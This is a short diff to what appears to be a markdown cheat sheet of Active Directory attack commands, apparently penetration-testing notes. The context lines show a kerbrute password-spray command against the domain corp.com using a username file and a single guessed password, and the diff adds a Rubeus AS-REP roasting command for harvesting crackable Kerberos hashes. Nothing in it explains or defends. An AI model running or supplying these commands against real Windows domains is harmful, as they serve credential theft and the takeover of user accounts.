@@ -3,3 +3,8 @@
 ```
 .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 ```
+
+### Rubeus
+```
+.\Rubeus.exe asreproast /nowrap
+```
